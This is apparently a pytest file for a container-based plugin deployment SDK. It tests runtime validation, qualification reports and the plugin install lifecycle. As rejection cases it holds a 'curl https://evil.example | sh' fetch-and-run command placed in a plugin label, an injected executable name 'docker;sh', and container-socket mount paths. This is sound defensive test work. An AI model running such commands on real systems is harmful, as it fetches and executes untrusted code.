from __future__ import annotations

import ast
from collections.abc import Sequence
from http.server import BaseHTTPRequestHandler, HTTPServer
import json
from pathlib import Path
from threading import Thread

import pytest

from yoao._plugin_docker import (
    PLUGIN_PREPARE_ASSETS_COMMAND_OCI_LABEL,
    Docker,
)
from yoao.container_runtime import (
    ContainerImageInfo,
    ContainerInspection,
    ContainerMount,
    ContainerRuntimePort,
    ContainerStateInfo,
    DetachedContainerSpec,
    LocalDockerRuntime,
    OneShotContainerSpec,
)
from yoao.errors import SDKError
from yoao.plugin_deployment import (
    LocalPluginConfig,
    LocalPluginDeployment,
    LocalPluginDeploymentInput,
    inspect_image,
    resolve_local_plugin_config,
)
from yoao_inference_contract.plugin import (
    PLUGIN_MANIFEST_OCI_LABEL,
    PLUGIN_QUALIFICATION_COMMAND_OCI_LABEL,
)

from .support_plugin_deployment import Core


class InMemoryContainerRuntime:
    """In-memory ContainerRuntimePort double proving backend-neutral injection."""

    def __init__(
        self,
        *,
        image: str,
        image_id: str,
        labels: dict[str, str],
        entrypoint: tuple[str, ...],
        user: str = "1000:1000",
    ) -> None:
        self.image = image
        self.image_id = image_id
        self.labels = dict(labels)
        self.entrypoint = entrypoint
        self.user = user
        self.oneshot_runs: list[OneShotContainerSpec] = []
        self.containers: dict[str, dict] = {}
        self.next_index = 1
        self.oneshot_hook = None

    def inspect_image(self, image: str) -> ContainerImageInfo:
        if image != self.image:
            raise SDKError("Local image does not have the approved digest")
        return ContainerImageInfo(
            image_id=self.image_id,
            repo_digests=(self.image,),
            labels=dict(self.labels),
        )

    def run_oneshot(self, spec: OneShotContainerSpec) -> str:
        spec.validate()
        self.oneshot_runs.append(spec)
        if self.oneshot_hook is not None:
            self.oneshot_hook(spec)
        return ""

    def run_detached(self, spec: DetachedContainerSpec, *, start: bool = True) -> str:
        spec.validate()
        container_id = f"{self.next_index:064x}"
        self.next_index += 1
        self.containers[container_id] = {
            "name": spec.name,
            "image": spec.image,
            "image_id": self.image_id,
            "labels": dict(spec.labels),
            "host_config": {
                "Privileged": False,
                "PidMode": "",
                "NetworkMode": spec.network,
                "Memory": spec.memory_mb * 1024 * 1024,
                "NanoCpus": int(spec.cpus * 1_000_000_000),
                "CapDrop": ["ALL"],
                "SecurityOpt": ["no-new-privileges"],
                "DeviceRequests": (
                    [{"DeviceIDs": [spec.gpu_uuid], "Capabilities": [["gpu"]]}]
                    if spec.gpu_uuid
                    else []
                ),
                "PortBindings": {
                    f"{port.container_port}/tcp": [
                        {"HostPort": str(port.host_port), "HostIp": ""}
                    ]
                    for port in spec.ports
                },
            },
            "mounts": tuple(
                {
                    "Type": "bind",
                    "Source": str(mount.source),
                    "Destination": mount.target,
                    "RW": not mount.readonly,
                }
                for mount in spec.mounts
            ),
            "user": spec.user,
            "entrypoint": self.entrypoint,
            "cmd": None,
            "running": False,
            "started_at": "0001-01-01T00:00:00Z",
            "finished_at": "0001-01-01T00:00:00Z",
        }
        if start:
            self.start_container(container_id)
        return container_id

    def start_container(self, container_id: str) -> None:
        record = self.containers[container_id]
        record["running"] = True
        record["started_at"] = f"2026-11-25T12:00:0{self.next_index}Z"

    def inspect_container(
        self,
        *,
        name: str | None = None,
        container_id: str | None = None,
    ) -> ContainerInspection | None:
        found_id = None
        if container_id is not None:
            if container_id in self.containers:
                found_id = container_id
        elif name is not None:
            for cid, record in self.containers.items():
                if record["name"] == name:
                    found_id = cid
                    break
        if found_id is None:
            return None
        record = self.containers[found_id]
        return ContainerInspection(
            container_id=found_id,
            name=record["name"],
            image_id=record["image_id"],
            image_ref=record["image"],
            labels=dict(record["labels"]),
            host_config=dict(record["host_config"]),
            mounts=record["mounts"],
            user=record["user"],
            entrypoint=record["entrypoint"],
            cmd=record["cmd"],
            state=ContainerStateInfo(
                running=record["running"],
                restarting=False,
                paused=False,
                dead=False,
                started_at=record["started_at"],
                finished_at=record["finished_at"],
            ),
        )

    def exec_in_container(
        self,
        container_id: str,
        command: Sequence[str],
        *,
        input_text: str | None = None,
    ) -> str:
        return "[]"

    def stop_and_remove(
        self,
        container_id: str,
        *,
        expected_started_at: str | None = None,
    ) -> None:
        record = self.containers.get(container_id)
        if record is None:
            return
        if (
            expected_started_at is not None
            and record["started_at"] != expected_started_at
        ):
            raise SDKError(
                "Container process identity differs from the quiescence proof"
            )
        record["running"] = False
        self.containers.pop(container_id, None)


def _sam_manifest_payload() -> dict:
    return {
        "plugin_id": "sam-service",
        "version": "2.0.0",
        "publisher": "vision-labs",
        "license": "Apache-2.0",
        "sdk_compatibility": ">=1",
        "entrypoint": [
            "sam-service",
            "serve",
            "--host",
            "0.0.0.0",
            "--port",
            "8100",
        ],
        "capabilities": ["inference", "segmentation", "interactive", "managed_models"],
        "models": [
            {
                "id": "sam-vit-h",
                "task": "interactive_seg",
                "is_interactive": True,
                "supported_prompts": ["point", "bbox"],
                "supported_inputs": ["full_image"],
                "supported_geometric_outputs": ["mask"],
            }
        ],
        "pools": {"interactive": {"cap": 2}},
        "resource": {
            "device": "cuda",
            "memory_mb": 4096,
            "gpu_memory_mb": 3072,
        },
        "asset_manifest_sha256": "f" * 64,
        "managed_model_compatibility": [
            {
                "framework": "sam_custom",
                "format": "sam-checkpoint-v2",
                "runtime_device": "cuda",
            }
        ],
        "allowed_asset_sources": ["https://weights.example"],
    }


def _write_qualification_report(spec: OneShotContainerSpec) -> None:
    from yoao_backend_runtime.lifecycle_evidence import build_managed_lifecycle_evidence
    from yoao_lifecycle_contract import memory_cycle_evidence

    context_mount = next(
        m for m in spec.mounts if m.target == "/var/lib/yoao-qualification/context.json"
    )
    output_mount = next(
        m for m in spec.mounts if m.target == "/var/lib/yoao-qualification/output"
    )
    context = json.loads(context_mount.source.read_text(encoding="utf-8"))
    versions = {
        "plugin_id": context["plugin_id"],
        "plugin_version": context["plugin_version"],
        "artifact": context["artifact"],
        "asset_manifest_sha256": context["asset_manifest_sha256"],
        "registry_id": context["registry_id"],
        "gpu_resource_id": context["gpu_resource_id"],
        "driver_version": "560.35",
        "cuda_build": "12.8",
        "sam_custom": "2.0.0",
    }
    cycles = [
        memory_cycle_evidence(
            cycle=i,
            generation=str(i),
            context_samples_mb=[100] * 5,
            loaded_samples_mb=[900] * 3,
            unloaded_samples_mb=[110] * 5,
        )
        for i in (1, 2)
    ]
    report = build_managed_lifecycle_evidence(
        backend_name=context["plugin_id"],
        deployment={
            "git_commit": "b" * 40,
            "image_id": context["image_id"],
            "runtime_versions": versions,
            "pool_topology": {
                "registry_id": context["registry_id"],
                "gpu_resource_id": context["gpu_resource_id"],
                "pools": context["pools"],
            },
        },
        artifacts=[
            {
                "kind": kind,
                "name": kind,
                "size_bytes": 4,
                "sha256": "a" * 64,
                "approval_ref": "APPROVED",
            }
            for kind in ("weight", "fixture")
        ],
        gpu={
            "uuid": context["physical_gpu_uuid"],
            "total_memory_mb": 24576,
            "driver_version": "560.35",
            "runtime_version": "12.8",
            "visible_device_count": 1,
        },
        cycles=cycles,
        contract_checks=dict.fromkeys(
            (
                "managed_lifecycle_advertised",
                "real_inference",
                "provider_or_device_gpu",
                "busy_unload_rejected",
                "cancel_accounting",
                "stale_generation_rejected",
                "token_replay_rejected",
                "partial_headers_rejected",
                "full_cleanup",
            ),
            True,
        ),
        final_residency={
            "state": "unloaded",
            "gpu_loaded": False,
            "evictable": False,
            "active_requests": 0,
            "builders": 0,
            "borrowers": 0,
            "pools": {name: {"resident": False} for name in context["pools"]},
        },
        runtime_ephemera_clean=True,
        generated_at="2026-11-25T12:00:00Z",
    )
    (output_mount.source / "report.json").write_text(
        json.dumps(report), encoding="utf-8"
    )


def test_container_runtime_port_protocol_and_validation():
    docker_rt = LocalDockerRuntime()
    podman_rt = LocalDockerRuntime(executable="podman")
    assert isinstance(docker_rt, ContainerRuntimePort)
    assert isinstance(podman_rt, ContainerRuntimePort)
    assert podman_rt.executable == "podman"

    with pytest.raises(SDKError, match="executable"):
        LocalDockerRuntime(executable="/usr/bin/docker")
    with pytest.raises(SDKError, match="executable"):
        LocalDockerRuntime(executable="docker;sh")

    image = "registry.example/sam-service@sha256:" + "1" * 64
    with pytest.raises(SDKError, match="Host networking"):
        OneShotContainerSpec(
            image=image,
            command=("sam-service", "describe"),
            network="host",
        ).validate()
    with pytest.raises(SDKError, match="sha256 digest"):
        OneShotContainerSpec(
            image="registry.example/sam-service:latest",
            command=("sam-service", "describe"),
        ).validate()

    for bad_host in (
        Path("/run/podman/podman.sock"),
        Path("/run/containerd/containerd.sock"),
        Path('/tmp/bad"quote'),
    ):
        with pytest.raises(SDKError, match="safe absolute path"):
            OneShotContainerSpec(
                image=image,
                command=("sam-service", "describe"),
                mounts=(
                    ContainerMount(source=bad_host, target="/data", readonly=True),
                ),
            ).validate()


def test_local_docker_runtime_missing_container_returns_none_and_normalizes_bare_image_id(
    monkeypatch,
):
    import subprocess
    from yoao.container_runtime import LocalDockerRuntime

    cid = "a" * 64
    bare_img = "b" * 64
    image = "registry.example/sam-service@sha256:" + "1" * 64
    calls: list[list[str]] = []

    def fake_run(cmd, **_kwargs):
        calls.append(cmd)
        if cmd[1:3] == ["container", "inspect"]:
            return subprocess.CompletedProcess(
                cmd, 1, stdout="", stderr=f"Error: No such container: {cid}\n"
            )
        if cmd[1:3] == ["image", "inspect"]:
            return subprocess.CompletedProcess(
                cmd,
                0,
                stdout=json.dumps(
                    {
                        "Id": bare_img,
                        "RepoDigests": [image],
                        "Config": {"Labels": {}},
                    }
                ),
                stderr="",
            )
        raise AssertionError(f"unexpected command: {cmd}")

    monkeypatch.setattr(subprocess, "run", fake_run)
    rt = LocalDockerRuntime()
    assert rt.inspect_container(container_id=cid) is None
    rt.stop_and_remove(cid)
    info = rt.inspect_image(image)
    assert info.image_id == f"sha256:{bare_img}"


def test_non_libreyolo_plugin_end_to_end_with_injected_runtime_port(
    monkeypatch, tmp_path
):
    image = "registry.example/sam-service@sha256:" + "1" * 64
    image_id = "sha256:" + "2" * 64
    manifest_payload = _sam_manifest_payload()
    prepare_cmd = ["sam-service", "fetch-weights", "--target", "/var/lib/yoao-plugin"]
    qualify_cmd = ["sam-service", "qualify-gpu"]
    labels = {
        PLUGIN_MANIFEST_OCI_LABEL: json.dumps(manifest_payload),
        PLUGIN_QUALIFICATION_COMMAND_OCI_LABEL: json.dumps(qualify_cmd),
        PLUGIN_PREPARE_ASSETS_COMMAND_OCI_LABEL: json.dumps(prepare_cmd),
    }
    runtime = InMemoryContainerRuntime(
        image=image,
        image_id=image_id,
        labels=labels,
        entrypoint=tuple(manifest_payload["entrypoint"]),
    )
    assert isinstance(runtime, ContainerRuntimePort)
    monkeypatch.setattr(Docker, "_user", staticmethod(lambda: "1000:1000"))

    inspected = inspect_image(image, runtime=runtime)
    assert inspected["image_id"] == image_id
    assert inspected["manifest"]["plugin_id"] == "sam-service"
    assert inspected["qualification_command"] == qualify_cmd
    assert inspected["prepare_assets_command"] == prepare_cmd

    class ReadyHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Length", "0")
            self.end_headers()

        def log_message(self, *_args):
            pass

    with HTTPServer(("127.0.0.1", 0), ReadyHandler) as server:
        serving = Thread(target=server.serve_forever, daemon=True)
        serving.start()
        try:
            spec = LocalPluginDeploymentInput(
                name="SAM Service",
                url=f"http://127.0.0.1:{server.server_address[1]}",
                image=image,
                gpu_resource_id="node/gpu-0",
                physical_gpu_uuid="GPU-12345678-1234-1234-1234-123456789abc",
                network="yoao-net",
                host_port=server.server_address[1],
                cpus=2,
                gpu_verify_keyring={"key1": "A" * 43},
                image_hosts=["weights.example"],
            )
            resolved, from_label = resolve_local_plugin_config(spec, runtime=runtime)
            assert from_label is True
            assert resolved.container_port == 8100

            core = Core()
            deployment = LocalPluginDeployment(
                core, "https://api.example", tmp_path / "state", runtime=runtime
            )
            assert deployment.runtime is runtime
            deployment.prepare(resolved)

            deployment.prepare_assets()
            assert len(runtime.oneshot_runs) == 1
            assert runtime.oneshot_runs[0].command == tuple(prepare_cmd)
            assert runtime.oneshot_runs[0].network == "yoao-net"

            runtime.oneshot_hook = _write_qualification_report
            qual = deployment.qualify()
            assert qual.report["passed"] is True
            assert runtime.oneshot_runs[-1].command == tuple(qualify_cmd)
            assert runtime.oneshot_runs[-1].network == "none"

            active = deployment.install()
            assert active.installation.status == "active"
            container_env = (tmp_path / "state" / "container.env").read_text()
            assert "YOAO_PLUGIN_ID=sam-service\n" in container_env
            assert "YOAO_PLUGIN_VERSION=2.0.0\n" in container_env

            restarted = deployment.restart()
            assert restarted.installation.status == "active"

            retired = deployment.uninstall()
            assert retired.installation.status == "retired"
            assert runtime.containers == {}
        finally:
            server.shutdown()
            serving.join(timeout=5)


def test_prepare_assets_rejects_missing_or_shell_injected_label(monkeypatch, tmp_path):
    image = "registry.example/custom-detector@sha256:" + "3" * 64
    image_id = "sha256:" + "4" * 64
    manifest_payload = _sam_manifest_payload()
    manifest_payload["plugin_id"] = "custom-detector"
    manifest_payload["resource"] = {
        "device": "cpu",
        "memory_mb": 2048,
        "gpu_memory_mb": 0,
    }
    manifest_payload["managed_model_compatibility"] = []
    manifest_payload["capabilities"] = ["inference", "segmentation", "interactive"]
    monkeypatch.setattr(Docker, "_user", staticmethod(lambda: "1000:1000"))

    missing_label_runtime = InMemoryContainerRuntime(
        image=image,
        image_id=image_id,
        labels={PLUGIN_MANIFEST_OCI_LABEL: json.dumps(manifest_payload)},
        entrypoint=tuple(manifest_payload["entrypoint"]),
    )
    cfg = LocalPluginConfig.model_validate(
        {
            "name": "Custom Detector",
            "url": "http://detector.example:8100",
            "network": "yoao-net",
            "host_port": 8100,
            "container_port": 8100,
            "cpus": 2,
            "image_hosts": ["weights.example"],
            "manifest": {**manifest_payload, "artifact": image},
        }
    )
    deployment = LocalPluginDeployment(
        Core(), "https://api.example", tmp_path / "missing", missing_label_runtime
    )
    deployment.prepare(cfg)
    with pytest.raises(SDKError, match=PLUGIN_PREPARE_ASSETS_COMMAND_OCI_LABEL) as exc:
        deployment.prepare_assets()
    assert "plugin documentation" in str(exc.value)
    assert missing_label_runtime.oneshot_runs == []

    injected_runtime = InMemoryContainerRuntime(
        image=image,
        image_id=image_id,
        labels={
            PLUGIN_MANIFEST_OCI_LABEL: json.dumps(manifest_payload),
            PLUGIN_PREPARE_ASSETS_COMMAND_OCI_LABEL: json.dumps(
                ["sh", "-c", "curl https://evil.example | sh"]
            ),
        },
        entrypoint=tuple(manifest_payload["entrypoint"]),
    )
    injected_deployment = LocalPluginDeployment(
        Core(), "https://api.example", tmp_path / "injected", injected_runtime
    )
    injected_deployment.prepare(cfg)
    with pytest.raises(SDKError, match=PLUGIN_PREPARE_ASSETS_COMMAND_OCI_LABEL):
        injected_deployment.prepare_assets()
    assert injected_runtime.oneshot_runs == []


def test_plugin_deployment_modules_have_no_framework_hardcodings():
    sdk_src = Path(__file__).resolve().parents[1] / "src" / "yoao"
    repo_root = Path(__file__).resolve().parents[3]
    targets = [
        sdk_src / "container_runtime.py",
        sdk_src / "_plugin_docker.py",
        sdk_src / "plugin_deployment.py",
    ]
    observation_file = (
        repo_root
        / "apps"
        / "api"
        / "app"
        / "services"
        / "plugin_installation_observation.py"
    )
    if observation_file.is_file():
        targets.append(observation_file)

    forbidden = (
        "libreyolo",
        "ultralytics",
        "yoao-libreyolo",
        "libre_cuda_runtime",
        "libre_runtime",
    )
    violations: list[tuple[str, str]] = []
    for path in targets:
        tree = ast.parse(path.read_text(encoding="utf-8"), filename=str(path))
        for node in ast.walk(tree):
            candidates: list[str] = []
            if isinstance(node, ast.Import):
                candidates.extend(alias.name for alias in node.names)
            elif isinstance(node, ast.ImportFrom):
                if node.module:
                    candidates.append(node.module)
                candidates.extend(alias.name for alias in node.names)
            elif isinstance(node, ast.Name):
                candidates.append(node.id)
            elif isinstance(node, ast.Attribute):
                candidates.append(node.attr)
            elif isinstance(node, ast.Constant) and isinstance(node.value, str):
                candidates.append(node.value)
            for text in candidates:
                lowered = text.lower()
                if any(token in lowered for token in forbidden):
                    violations.append((path.name, text))
    assert violations == []
